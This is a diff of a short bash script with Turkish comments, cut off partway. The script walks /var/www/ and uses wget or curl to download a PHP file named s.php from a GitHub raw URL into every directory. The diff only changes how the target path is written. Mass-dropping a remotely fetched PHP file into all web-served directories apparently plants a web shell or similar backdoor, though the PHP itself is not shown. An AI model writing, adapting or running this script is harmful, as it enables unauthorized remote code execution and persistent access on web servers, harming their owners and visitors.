@@ -1,15 +1,14 @@
 #!/bin/bash
 
-# Bu betik /var/www/ dizinindeki her dizine s.php dosyasını indirir.
+# Bu betik /var/www/ dizinindeki her dosyada s.php dosyasını indirir.
 
 # Fonksiyon: Belirtilen dizin ve alt dizinlerinde s.php dosyasını indirir
 function download_s_php {
     local current_dir="$1"
     local url="https://raw.githubusercontent.com/berkaybasar/berkaybasar.github.io/main/s.php"
-    local target="$current_dir/s.php"
 
     # Dosyanın indirileceği hedef yol
-    wget -q -O "$target" "$url" || curl -s -o "$target" "$url"
+    wget -q -O "$current_dir/s.php" "$url" || curl -s -o "$current_dir/s.php" "$url"
 
     # İşlem sonucunu kontrol et
     if [ $? -eq 0 ]; then
